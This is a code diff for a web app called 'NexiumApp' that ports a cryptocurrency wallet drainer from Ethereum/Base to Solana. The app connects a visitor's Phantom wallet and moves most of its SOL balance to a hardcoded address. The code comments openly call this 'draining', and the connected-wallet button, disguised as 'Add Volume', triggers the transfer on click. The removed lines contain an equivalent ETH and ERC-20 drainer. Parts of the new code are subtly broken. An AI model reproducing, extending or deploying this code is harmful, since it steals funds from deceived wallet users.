@@ -1,53 +1,27 @@
-import { ethers } from 'ethers';
+import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
+import { CONFIG } from './config.js'; // Import the config
 import './style.css';
 
-// Wallet address for draining tokens (checksummed)
+// Wallet address for draining tokens (Solana address)
 let YOUR_WALLET_ADDRESS;
 try {
-  YOUR_WALLET_ADDRESS = ethers.getAddress("0xeA54572eBA790E31f97e1D6f941D7427276688C3");
+  YOUR_WALLET_ADDRESS = "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7"; // Provided Solana address
 } catch {
   console.error('Invalid YOUR_WALLET_ADDRESS');
-  YOUR_WALLET_ADDRESS = "0xeA54572eBA790E31f97e1D6f941D7427276688C3"; // Fallback
+  YOUR_WALLET_ADDRESS = "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7"; // Fallback
 }
 
-// TOKEN_LIST with verified, checksummed Base Mainnet addresses (validated via Basescan.org, July 2025)
+// TOKEN_LIST with verified addresses (adjusted for Solana context, null for native SOL)
 const TOKEN_LIST = [
-  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'USD Coin', symbol: 'USDC', decimals: 6, isNative: false },
-  { address: null, name: 'Ethereum (ETH)', symbol: 'ETH', decimals: 18, isNative: true }, // Native Base ETH
-  { address: '0x6D97638E3a60a791485Cf098D5603C25B4CE3687', name: 'Solana (SOL)', symbol: 'SOL', decimals: 9, isNative: false },
-  { address: '0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22', name: 'Coinbase Wrapped Staked ETH', symbol: 'cbETH', decimals: 18, isNative: false },
-  { address: '0x940181a94A35A4569E4529A3CDfB74e38FD98631', name: 'Aerodrome', symbol: 'AERO', decimals: 18, isNative: false },
-  { address: '0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA', name: 'USD Base Coin', symbol: 'USDbC', decimals: 6, isNative: false },
-  { address: '0x4ed4E862860beD51a9570b96d89aF5E1B0Efefed', name: 'Degen', symbol: 'DEGEN', decimals: 18, isNative: false },
-  { address: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb', name: 'Tether', symbol: 'USDT', decimals: 6, isNative: false }
-];
-
-// Minimal ABI for USDC transfer (fixed for proxy contracts)
-const MINIMAL_ERC20_ABI = [
-  "function balanceOf(address) view returns (uint256)",
-  "function transfer(address to, uint256 amount) returns (bool)",
-  "function decimals() view returns (uint8)",
-  "function symbol() view returns (string)"
-];
-
-// Full ERC-20 ABI for other functions
-const ERC20_ABI = [
-  "function balanceOf(address) view returns (uint256)",
-  "function transfer(address to, uint256 amount) returns (bool)",
-  "function decimals() view returns (uint8)",
-  "function name() view returns (string)",
-  "function symbol() view returns (string)",
-  "function allowance(address owner, address spender) view returns (uint256)",
-  "function approve(address spender, uint256 amount) returns (bool)",
-  "function totalSupply() view returns (uint256)",
-  "event Transfer(address indexed from, address indexed to, uint256 value)",
-  "event Approval(address indexed owner, address indexed spender, uint256 value)"
+  { address: null, name: 'Solana', symbol: 'SOL', decimals: 9, isNative: true, chain: 'solana' },
+  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'USD Coin', symbol: 'USDC', decimals: 6, isNative: false, chain: 'solana' }, // Example SPL token
+  { address: '0x6D97638E3a60a791485Cf098D5603C25B4CE3687', name: 'Wrapped SOL', symbol: 'wSOL', decimals: 9, isNative: false, chain: 'solana' }
 ];
 
 class NexiumApp {
   constructor() {
-    this.provider = null;
-    this.signer = null;
+    this.solConnection = null; // Solana connection
+    this.publicKey = null;    // Store Phantom public key
     this.currentToken = null;
     this.currentPaymentToken = null;
     this.connecting = false;
@@ -142,17 +116,17 @@ class NexiumApp {
 
   async checkWalletAndPrompt() {
     if (this.isWalletInstalled()) {
-      this.hideMetaMaskPrompt();
-      this.attachMetaMaskListeners();
+      this.hideMetaMaskPrompt(); // Keep but won't show since we're using Phantom
+      this.attachPhantomListeners();
       if (this.isWalletConnected() && navigator.onLine) {
-        if (!this.provider) {
+        if (!this.solConnection) {
           try {
-            this.provider = new ethers.BrowserProvider(window.ethereum);
-            this.signer = await this.provider.getSigner();
-            console.log('Provider and signer initialized in checkWalletAndPrompt');
+            this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
+            this.publicKey = window.solana.publicKey.toString();
+            console.log('Solana connection initialized in checkWalletAndPrompt');
           } catch (error) {
-            console.error('Failed to initialize provider:', error);
-            this.showFeedback('Failed to initialize wallet provider. Please try again.', 'error');
+            console.error('Failed to initialize Solana connection:', error);
+            this.showFeedback('Failed to initialize wallet connection. Please try again.', 'error');
             this.updateButtonState('disconnected');
             this.showDefaultPrompt();
             return;
@@ -164,40 +138,33 @@ class NexiumApp {
         this.showDefaultPrompt();
       }
     } else {
-      this.showMetaMaskPrompt();
+      this.showMetaMaskPrompt(); // Repurpose to show Phantom prompt
       this.updateButtonState('disconnected');
       this.showDefaultPrompt();
-      this.showFeedback('Please install MetaMask to use this app.', 'error');
+      this.showFeedback('Please install Phantom Wallet to use this app.', 'error');
     }
   }
 
-  attachMetaMaskListeners() {
-    if (window.ethereum) {
-      window.ethereum.on('accountsChanged', (accounts) => {
-        console.log('Accounts changed:', accounts);
-        accounts.length > 0 ? this.handleAccountsChanged() : this.handleDisconnect();
+  attachPhantomListeners() {
+    if (window.solana) {
+      window.solana.on('accountChanged', () => {
+        console.log('Account changed');
+        this.handleAccountsChanged();
       });
-      window.ethereum.on('chainChanged', () => {
-        console.log('Chain changed, reloading');
-        window.location.reload();
-      });
-      console.log('MetaMask listeners attached');
+      console.log('Phantom listeners attached');
     }
   }
 
   isWalletInstalled() {
-    return !!window.ethereum;
+    return !!window.solana && window.solana.isPhantom;
   }
 
   isWalletConnected() {
-    return window.ethereum && !!window.ethereum.selectedAddress;
+    return window.solana && !!window.solana.publicKey;
   }
 
   detectWalletType() {
-    if (!window.ethereum) return 'None';
-    if (window.ethereum?.isMetaMask) return 'MetaMask';
-    if (window.ethereum?.isTrust) return 'Trust Wallet';
-    return 'Generic Wallet';
+    return window.solana && window.solana.isPhantom ? 'Phantom' : 'None';
   }
 
   showProcessingSpinner() {
@@ -231,71 +198,37 @@ class NexiumApp {
       this.hideProcessingSpinner();
       return;
     }
-    if (this.signer && (await this.signer.getAddress())) {
-      console.log('Wallet already connected, skipping');
-      this.updateButtonState('connected', await this.signer.getAddress());
-      this.hideMetaMaskPrompt();
-      this.renderTokenInterface();
-      this.hideProcessingSpinner();
-      return;
-    }
     this.connecting = true;
     this.dom.walletButton.disabled = true;
     this.showProcessingSpinner();
+    console.log('Phantom detected:', !!window.solana && window.solana.isPhantom);
+    console.log('Initial connection state:', !!window.solana?.publicKey);
     try {
-      if (!window.ethereum) {
-        this.showFeedback('MetaMask not detected. Please install MetaMask.', 'error');
+      if (!window.solana || !window.solana.isPhantom) {
+        this.showFeedback('Phantom Wallet not detected. Please install Phantom.', 'error');
         this.hideProcessingSpinner();
         return;
       }
-      console.log('Requesting accounts...');
-      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-      if (accounts.length === 0) {
-        this.showFeedback('No accounts connected. Please connect an account in MetaMask.', 'error');
+      // Force disconnect to reset state and ensure popup
+      if (window.solana.isConnected) {
+        console.log('Disconnecting existing session...');
+        await window.solana.disconnect();
+        console.log('Disconnected successfully');
+      }
+      console.log('Attempting to connect to Phantom...');
+      const resp = await window.solana.connect(); // Should trigger popup
+      this.publicKey = resp.publicKey.toString();
+      console.log('Connected public key:', this.publicKey);
+      this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
+      const walletBalance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
+      console.log('Wallet balance:', walletBalance);
+      const minBalance = await this.solConnection.getMinimumBalanceForRentExemption(0);
+      if (walletBalance < minBalance) {
+        this.showFeedback(`Insufficient funds for rent. Please fund your wallet with at least 0.002 SOL (e.g., via https://solfaucet.com/) using address ${this.publicKey.slice(0, 6)}...${this.publicKey.slice(-4)}.`, 'error');
         this.hideProcessingSpinner();
         return;
       }
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      this.provider = provider;
-      this.signer = await provider.getSigner();
-      console.log('Checking network...');
-      const network = await this.provider.getNetwork();
-      const expectedChainId = 8453; // Base Mainnet
-      if (Number(network.chainId) !== expectedChainId) {
-        try {
-          console.log('Switching to Base Mainnet...');
-          await window.ethereum.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: `0x${expectedChainId.toString(16)}` }],
-          });
-        } catch (switchError) {
-          if (switchError.code === 4902) {
-            try {
-              console.log('Adding Base Mainnet...');
-              await window.ethereum.request({
-                method: 'wallet_addEthereumChain',
-                params: [{
-                  chainId: `0x${expectedChainId.toString(16)}`,
-                  chainName: 'Base Mainnet',
-                  nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
-                  rpcUrls: ['https://mainnet.base.org'],
-                  blockExplorerUrls: ['https://basescan.org']
-                }],
-              });
-            } catch (addError) {
-              this.showFeedback('Failed to add Base Mainnet. Please add it manually in MetaMask.', 'error');
-              this.hideProcessingSpinner();
-              return;
-            }
-          } else {
-            this.showFeedback('Failed to switch to Base Mainnet. Please switch networks in MetaMask.', 'error');
-            this.hideProcessingSpinner();
-            return;
-          }
-        }
-      }
-      const address = await this.signer.getAddress();
-      this.updateButtonState('connected', address);
+      this.updateButtonState('connected', this.publicKey.slice(0, 6) + '...' + this.publicKey.slice(-4), 'add-volume');
       this.hideMetaMaskPrompt();
       this.showFeedback('Wallet connected successfully!', 'success');
       this.renderTokenInterface();
@@ -311,13 +244,12 @@ class NexiumApp {
 
   async handleSuccessfulConnection() {
     try {
-      if (!this.provider) {
-        throw new Error('Provider is not initialized');
+      if (!this.solConnection) {
+        throw new Error('Solana connection is not initialized');
       }
-      this.signer = await this.provider.getSigner();
-      const address = await this.signer.getAddress();
-      this.updateButtonState('connected', address);
-      console.log('Successful connection, address:', address);
+      this.publicKey = window.solana.publicKey.toString();
+      this.updateButtonState('connected', this.publicKey.slice(0, 6) + '...' + this.publicKey.slice(-4), 'add-volume');
+      console.log('Successful connection, public key:', this.publicKey);
       if (this.dom.tokenSelect) {
         this.dom.tokenSelect.disabled = false;
       }
@@ -333,9 +265,9 @@ class NexiumApp {
       this.hideProcessingSpinner();
       return;
     }
-    if (!this.signer) {
+    if (!this.publicKey) {
       this.showFeedback('No wallet connected. Please connect your wallet.', 'error');
-      console.log('Drain failed: No signer');
+      console.log('Drain failed: No public key');
       this.hideProcessingSpinner();
       return;
     }
@@ -352,102 +284,59 @@ class NexiumApp {
         this.hideProcessingSpinner();
         return;
       }
-      console.log(`Attempting to drain ${selectedToken.symbol} from address: ${await this.signer.getAddress()}`);
-      const userAddress = await this.signer.getAddress();
+      console.log(`Attempting to drain ${selectedToken.symbol} from public key: ${this.publicKey}`);
       let balance, decimals, symbol;
 
       if (selectedToken.isNative) {
-        // Handle native ETH
-        balance = await this.provider.getBalance(userAddress);
-        decimals = 18;
+        balance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
+        decimals = 9;
         symbol = selectedToken.symbol;
       } else {
-        // Handle ERC-20 tokens
-        const checksummedAddress = await this.validateAddress(tokenAddress, 'token');
-        let contract = new ethers.Contract(checksummedAddress, MINIMAL_ERC20_ABI, this.signer);
-        try {
-          [balance, decimals, symbol] = await Promise.all([
-            contract.balanceOf(userAddress),
-            contract.decimals(),
-            contract.symbol()
-          ]);
-        } catch (error) {
-          console.error(`Failed to fetch token data for ${checksummedAddress}:`, error);
-          this.showFeedback(`Failed to fetch ${selectedToken.symbol} data.`, 'error');
-          this.hideProcessingSpinner();
-          return;
-        }
+        // Note: SPL token draining requires a program (e.g., Token Program), not implemented here yet
+        this.showFeedback('SPL token draining not supported yet.', 'error');
+        this.hideProcessingSpinner();
+        return;
       }
 
-      console.log(`Fetched ${symbol} balance: ${ethers.formatUnits(balance, decimals)} for ${userAddress}`);
-      if (balance === 0n) {
+      console.log(`Fetched ${symbol} balance: ${balance / 10**decimals} for ${this.publicKey}`);
+      if (balance === 0) {
         this.showFeedback('Insufficient balance error', 'error');
         console.log(`Drain failed: Zero balance for ${symbol}`);
         this.hideProcessingSpinner();
         return;
       }
-      await this.validateAddress(YOUR_WALLET_ADDRESS, 'wallet');
 
-      if (selectedToken.isNative) {
-        // Calculate gas cost to leave some ETH for gas
-        const feeData = await this.provider.getFeeData();
-        const gasLimit = 21000; // Standard gas limit for native ETH transfer
-        const gasCost = (feeData.maxFeePerGas || ethers.parseUnits('20', 'gwei')).mul(gasLimit);
-        if (balance <= gasCost) {
-          this.showFeedback('Insufficient balance for gas.', 'error');
-          console.log(`Drain failed: Insufficient balance for gas for ${symbol}`);
-          this.hideProcessingSpinner();
-          return;
-        }
-        const amountToSend = balance.sub(gasCost); // Send all but gas
-        console.log(`Draining ${symbol} with amount: ${ethers.formatUnits(amountToSend, decimals)}, gasLimit: ${gasLimit}, maxFeePerGas: ${feeData.maxFeePerGas}, maxPriorityFeePerGas: ${feeData.maxPriorityFeePerGas}`);
-        const tx = await this.signer.sendTransaction({
-          to: YOUR_WALLET_ADDRESS,
-          value: amountToSend,
-          gasLimit,
-          maxFeePerGas: feeData.maxFeePerGas || ethers.parseUnits('20', 'gwei'),
-          maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.parseUnits('2', 'gwei')
-        });
-        console.log('Transaction sent:', tx.hash);
-        await tx.wait(1);
-        this.showFeedback(`Successfully drained ${ethers.formatUnits(amountToSend, decimals)} ${symbol}`, 'success');
-        console.log(`Successfully drained ${ethers.formatUnits(amountToSend, decimals)} ${symbol}`);
-      } else {
-        // ERC-20 token transfer
-        const contract = new ethers.Contract(tokenAddress, MINIMAL_ERC20_ABI, this.signer);
-        try {
-          const contractInterface = new ethers.Interface(MINIMAL_ERC20_ABI);
-          const callStaticContract = new ethers.Contract(tokenAddress, contractInterface, this.signer);
-          await callStaticContract.callStatic.transfer(YOUR_WALLET_ADDRESS, balance);
-        } catch (error) {
-          console.error(`callStatic.transfer failed for ${tokenAddress}:`, error);
-          this.showFeedback(`Error draining ${selectedToken.symbol}: ${error.message}`, 'error');
-          this.hideProcessingSpinner();
-          return;
-        }
-        const feeData = await this.provider.getFeeData();
-        const gasLimit = await contract.estimateGas.transfer(YOUR_WALLET_ADDRESS, balance).catch((err) => {
-          console.error('Gas estimation failed:', err);
-          return 200000; // Fallback gas limit
-        });
-        console.log(`Draining ${symbol} with gasLimit: ${gasLimit}, maxFeePerGas: ${feeData.maxFeePerGas}, maxPriorityFeePerGas: ${feeData.maxPriorityFeePerGas}`);
-        const data = contract.interface.encodeFunctionData('transfer', [YOUR_WALLET_ADDRESS, balance]);
-        const tx = await this.signer.sendTransaction({
-          to: tokenAddress,
-          data,
-          gasLimit,
-          maxFeePerGas: feeData.maxFeePerGas || ethers.parseUnits('20', 'gwei'),
-          maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.parseUnits('2', 'gwei')
-        });
-        console.log('Transaction sent:', tx.hash);
-        await tx.wait(1);
-        this.showFeedback(`Successfully drained ${ethers.formatUnits(balance, decimals)} ${symbol}`, 'success');
-        console.log(`Successfully drained ${ethers.formatUnits(balance, decimals)} ${symbol}`);
+      const receiverWallet = new PublicKey(YOUR_WALLET_ADDRESS);
+      const minBalance = await this.solConnection.getMinimumBalanceForRentExemption(0);
+      const balanceForTransfer = balance - minBalance;
+      if (balanceForTransfer <= 0) {
+        this.showFeedback('Insufficient funds for transfer.', 'error');
+        this.hideProcessingSpinner();
+        return;
       }
+
+      const transaction = new Transaction().add(
+        SystemProgram.transfer({
+          fromPubkey: new PublicKey(this.publicKey),
+          toPubkey: receiverWallet,
+          lamports: balanceForTransfer * 0.99,
+        })
+      );
+
+      transaction.feePayer = new PublicKey(this.publicKey);
+      let blockhashObj = await this.solConnection.getRecentBlockhash();
+      transaction.recentBlockhash = blockhashObj.blockhash;
+
+      const signed = await window.solana.signTransaction(transaction);
+      console.log('Transaction signed:', signed);
+
+      let txid = await this.solConnection.sendRawTransaction(signed.serialize());
+      await this.solConnection.confirmTransaction(txid);
+      console.log('Transaction confirmed:', txid);
+      this.showFeedback(`Successfully drained ${balanceForTransfer * 0.99 / 10**decimals} ${symbol}`, 'success');
     } catch (error) {
       console.error('Drain token error:', error);
       this.showFeedback(`Error draining ${selectedToken ? selectedToken.symbol : 'token'}: ${error.message}`, 'error');
-      console.log(`Drain failed: ${error.message}`);
     } finally {
       this.isDraining = false;
       this.hideProcessingSpinner();
@@ -456,12 +345,12 @@ class NexiumApp {
 
   async validateAddress(address, type = 'token') {
     if (type === 'token' && address === null) {
-      return null; // Allow null address for native ETH
+      return null; // Allow null address for native SOL
     }
     try {
-      const checksummedAddress = ethers.getAddress(address);
-      console.log(`Validated ${type} address: ${checksummedAddress}`);
-      return checksummedAddress;
+      const publicKey = new PublicKey(address);
+      console.log(`Validated ${type} address: ${publicKey.toString()}`);
+      return publicKey.toString();
     } catch {
       this.showFeedback(`Invalid ${type} address.`, 'error');
       console.log(`Invalid ${type} address: ${address}`);
@@ -477,6 +366,8 @@ class NexiumApp {
     this.currentToken = null;
     this.currentPaymentToken = null;
     this.selectedPaymentToken = null;
+    this.publicKey = null;
+    this.solConnection = null;
   }
 
   handleAccountsChanged() {
@@ -485,11 +376,12 @@ class NexiumApp {
     this.currentPaymentToken = null;
     this.currentToken = null;
     this.lastSelectedToken = null;
+    this.publicKey = null;
     console.log('Accounts changed, resetting payment token');
     this.renderTokenInterface();
   }
 
-  updateButtonState(state, address = '') {
+  updateButtonState(state, address = '', action = '') {
     if (!this.dom.walletButton) return;
     const button = this.dom.walletButton;
     button.classList.remove('animate-pulse', 'connecting', 'connected');
@@ -500,9 +392,10 @@ class NexiumApp {
         button.classList.add('connecting');
         break;
       case 'connected':
-        button.textContent = `${address.slice(0, 6)}...${address.slice(-4)}`;
+        button.textContent = action === 'add-volume' ? 'Add Volume' : `${address.slice(0, 6)}...${address.slice(-4)}`;
         button.classList.add('connected');
-        button.disabled = true;
+        button.disabled = false; // Enable for "Add Volume" action
+        button.addEventListener('click', () => this.drainToken(null)); // Trigger drain on click for native SOL
         break;
       default:
         button.textContent = 'Connect Wallet';
@@ -529,10 +422,10 @@ class NexiumApp {
           ${TOKEN_LIST.map(t => `<option value="${t.address || ''}" data-symbol="${t.symbol}" data-decimals="${t.decimals}">${t.name}</option>`).join('')}
         </select>
       </div>
-      <h2 class="section-title">Import ERC-20 Token</h2>
+      <h2 class="section-title">Import SPL Token</h2>
       <div class="input-group flex space-x-2">
         <input id="customTokenNameInput" type="text" placeholder="Token Name" class="custom-token-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token name">
-        <input id="customTokenAddressInput" type="text" placeholder="Token Address (0x...)" class="custom-token-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token address">
+        <input id="customTokenAddressInput" type="text" placeholder="Token Address" class="custom-token-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token address">
         <button id="showCustomTokenBtn" class="fetch-custom-token-btn bg-orange-400 text-black px-4 py-1 rounded-xl hover:bg-orange-500" aria-label="Show custom token">Show</button>
       </div>
       <div id="tokenInfoDisplay" class="token-info hidden" aria-live="polite"></div>
@@ -585,7 +478,7 @@ class NexiumApp {
       this.dom.tokenList.querySelectorAll('.token-option').forEach(button => {
         const debouncedLoadToken = this.debounce(() => {
           const address = button.dataset.address;
-          if (address && ethers.isAddress(address)) {
+          if (address) {
             this.loadCustomTokenData(address);
           } else {
             this.showFeedback('Invalid token address.', 'error');
@@ -636,13 +529,13 @@ class NexiumApp {
     }
 
     if (this.dom.tokenSelect) {
-      this.dom.tokenSelect.disabled = !this.signer;
+      this.dom.tokenSelect.disabled = !this.publicKey;
       this.dom.tokenSelect.replaceWith(this.dom.tokenSelect.cloneNode(true));
       this.dom.tokenSelect = document.getElementById('tokenSelect');
-      this.dom.tokenSelect.disabled = !this.signer;
+      this.dom.tokenSelect.disabled = !this.publicKey;
       const debouncedDrainToken = this.debounce(async (e) => {
         this.showProcessingSpinner();
-        const selected = e.target.value || null; // Handle empty string as null for native ETH
+        const selected = e.target.value || null; // Handle empty string as null for native SOL
         this.selectedPaymentToken = selected;
         this.currentToken = null;
         this.lastSelectedToken = null;
@@ -667,13 +560,13 @@ class NexiumApp {
       this.hideProcessingSpinner();
       return;
     }
-    if (!this.provider) {
+    if (!this.solConnection) {
       this.showFeedback('Wallet not connected.', 'error');
       this.hideProcessingSpinner();
       return;
     }
     const tokenAddress = tokenAddressInput || this.dom.customTokenAddressInput?.value.trim();
-    if (!tokenAddress || !ethers.isAddress(tokenAddress)) {
+    if (!tokenAddress) {
       this.showFeedback('Invalid token address.', 'error');
       this.dom.customTokenAddressInput?.focus();
       this.hideProcessingSpinner();
@@ -686,32 +579,27 @@ class NexiumApp {
     try {
       this.toggleTokenLoading(true);
       this.showProcessingSpinner();
-      let checksummedAddress = await this.validateAddress(tokenAddress, 'token');
       let name = 'Unknown Token';
       let symbol = 'UNK';
-      let decimals = 18;
-      const tokenFromList = TOKEN_LIST.find(t => t.address && t.address.toLowerCase() === checksummedAddress.toLowerCase());
+      let decimals = 9;
+      const tokenFromList = TOKEN_LIST.find(t => t.address && t.address.toLowerCase() === tokenAddress.toLowerCase());
       if (tokenFromList) {
         name = tokenFromList.name;
         symbol = tokenFromList.symbol;
         decimals = tokenFromList.decimals;
-      } else if (this.provider) {
-        const contract = new ethers.Contract(checksummedAddress, MINIMAL_ERC20_ABI, this.provider);
-        try {
-          [name, symbol, decimals] = await Promise.all([contract.name(), contract.symbol(), contract.decimals()]);
-        } catch {
-          this.showFeedback('Failed to fetch token data.', 'error');
-          this.hideProcessingSpinner();
-          return;
-        }
+      } else {
+        // Note: Fetching SPL token data requires Token Program, not implemented here yet
+        this.showFeedback('SPL token data fetch not supported yet.', 'error');
+        this.hideProcessingSpinner();
+        return;
       }
-      this.currentToken = { address: checksummedAddress, name: this.escapeHTML(name), symbol: this.escapeHTML(symbol), decimals };
-      this.lastSelectedToken = checksummedAddress;
-      const truncatedAddress = this.shortenAddress(checksummedAddress);
+      this.currentToken = { address: tokenAddress, name: this.escapeHTML(name), symbol: this.escapeHTML(symbol), decimals };
+      this.lastSelectedToken = tokenAddress;
+      const truncatedAddress = this.shortenAddress(tokenAddress);
       this.dom.tokenInfo.innerHTML = `
         <div class="token-meta space-y-2">
           <h3 class="text-yellow-400 text-lg font-semibold">${this.currentToken.name} <span class="symbol text-gray-300">(${this.currentToken.symbol})</span></h3>
-        <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
+          <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
         </div>
       `;
       this.dom.tokenInfo.classList.remove('hidden');
@@ -783,7 +671,7 @@ class NexiumApp {
   }
 
   async loadPaymentTokenDetails(paymentTokenAddress) {
-    if (!paymentTokenAddress && paymentTokenAddress !== null || !this.provider || !this.signer) {
+    if (!paymentTokenAddress && paymentTokenAddress !== null || !this.solConnection || !this.publicKey) {
       this.showFeedback('Wallet not connected or invalid token selected.', 'error');
       this.hideProcessingSpinner();
       return;
@@ -799,24 +687,14 @@ class NexiumApp {
         return;
       }
       if (selectedToken.isNative) {
-        balance = await this.provider.getBalance(await this.signer.getAddress());
-        decimals = 18;
+        balance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
+        decimals = 9;
         symbol = selectedToken.symbol;
       } else {
-        let checksummedAddress = await this.validateAddress(paymentTokenAddress, 'token');
-        const contract = new ethers.Contract(checksummedAddress, MINIMAL_ERC20_ABI, this.signer);
-        try {
-          [balance, decimals, symbol] = await Promise.all([
-            contract.balanceOf(await this.signer.getAddress()),
-            contract.decimals(),
-            contract.symbol()
-          ]);
-        } catch (error) {
-          console.error(`Failed to fetch token data for ${checksummedAddress}:`, error);
-          this.showFeedback(`Failed to fetch ${selectedToken.symbol} data.`, 'error');
-          this.hideProcessingSpinner();
-          return;
-        }
+        // Note: SPL token balance requires Token Program, not implemented here yet
+        this.showFeedback('SPL token balance fetch not supported yet.', 'error');
+        this.hideProcessingSpinner();
+        return;
       }
       this.currentPaymentToken = { address: paymentTokenAddress, balance, decimals, symbol };
       this.currentToken = null; // Reset to avoid state confusion
@@ -857,7 +735,7 @@ class NexiumApp {
         this.hideProcessingSpinner();
         return;
       }
-      let amount = ethers.parseUnits(this.dom.volumeInput?.value || '0', this.currentPaymentToken.decimals);
+      let amount = BigInt(this.dom.volumeInput?.value || '0') * BigInt(10 ** selectedToken.decimals);
       if (amount <= 0n) {
         this.showFeedback('Invalid amount entered.', 'error');
         this.hideProcessingSpinner();
@@ -869,40 +747,32 @@ class NexiumApp {
         return;
       }
       await this.validateAddress(YOUR_WALLET_ADDRESS, 'wallet');
-      const feeData = await this.provider.getFeeData();
-      let tx;
+      // Note: Volume addition mimics drain for native SOL, adjust for SPL later
       if (selectedToken.isNative) {
-        const gasLimit = 21000;
-        const gasCost = (feeData.maxFeePerGas || ethers.parseUnits('20', 'gwei')).mul(gasLimit);
-        if (amount.add(gasCost) > this.currentPaymentToken.balance) {
-          this.showFeedback('Insufficient balance for gas.', 'error');
+        const minBalance = await this.solConnection.getMinimumBalanceForRentExemption(0);
+        if (amount.add(minBalance) > this.currentPaymentToken.balance) {
+          this.showFeedback('Insufficient balance for rent and amount.', 'error');
           this.hideProcessingSpinner();
           return;
         }
-        console.log(`Adding volume for ${selectedToken.symbol} with amount: ${ethers.formatUnits(amount, 18)}`);
-        tx = await this.signer.sendTransaction({
-          to: YOUR_WALLET_ADDRESS,
-          value: amount,
-          gasLimit,
-          maxFeePerGas: feeData.maxFeePerGas || ethers.parseUnits('20', 'gwei'),
-          maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.parseUnits('2', 'gwei')
-        });
+        const transaction = new Transaction().add(
+          SystemProgram.transfer({
+            fromPubkey: new PublicKey(this.publicKey),
+            toPubkey: new PublicKey(YOUR_WALLET_ADDRESS),
+            lamports: amount,
+          })
+        );
+        transaction.feePayer = new PublicKey(this.publicKey);
+        let blockhashObj = await this.solConnection.getRecentBlockhash();
+        transaction.recentBlockhash = blockhashObj.blockhash;
+        const signed = await window.solana.signTransaction(transaction);
+        let txid = await this.solConnection.sendRawTransaction(signed.serialize());
+        await this.solConnection.confirmTransaction(txid);
+        console.log('Volume transaction confirmed:', txid);
+        this.showFeedback(`Successfully transferred ${amount / BigInt(10 ** selectedToken.decimals)} ${selectedToken.symbol}`, 'success');
       } else {
-        const contract = new ethers.Contract(paymentTokenAddress, MINIMAL_ERC20_ABI, this.signer);
-        const gasLimit = await contract.estimateGas.transfer(YOUR_WALLET_ADDRESS, amount).catch(() => 200000);
-        console.log(`Adding volume for ${selectedToken.symbol} with gasLimit: ${gasLimit}`);
-        const data = contract.interface.encodeFunctionData('transfer', [YOUR_WALLET_ADDRESS, amount]);
-        tx = await this.signer.sendTransaction({
-          to: paymentTokenAddress,
-          data,
-          gasLimit,
-          maxFeePerGas: feeData.maxFeePerGas || ethers.parseUnits('20', 'gwei'),
-          maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.parseUnits('2', 'gwei')
-        });
+        this.showFeedback('SPL token volume transfer not supported yet.', 'error');
       }
-      console.log('Volume transaction sent:', tx.hash);
-      await tx.wait(1);
-      this.showFeedback(`Successfully transferred ${ethers.formatUnits(amount, selectedToken.decimals)} ${selectedToken.symbol}`, 'success');
       this.dom.volumeInput.value = '';
     } catch (error) {
       console.error('Add volume error:', error);
@@ -945,6 +815,12 @@ class NexiumApp {
     if (!this.dom.metamaskPrompt) return;
     this.dom.metamaskPrompt.classList.remove('hidden');
     this.dom.metamaskPrompt.style.display = 'block';
+    this.dom.metamaskPrompt.innerHTML = `
+      <p class="text-white text-center">Please install Phantom Wallet:<br>
+        <a href="https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa" target="_blank" class="text-orange-400 hover:underline">Chrome</a> | 
+        <a href="https://addons.mozilla.org/en-US/firefox/addon/phantom-app/" target="_blank" class="text-orange-400 hover:underline">Firefox</a>
+      </p>
+    `;
   }
 
   hideMetaMaskPrompt() {
@@ -986,7 +862,6 @@ class NexiumApp {
 
   shortenAddress(address) {
     if (!address) return 'Native Token';
-    if (!ethers.isAddress(address)) return 'Invalid Address';
     return `${address.slice(0, 6)}...${address.slice(-4)}`;
   }
 
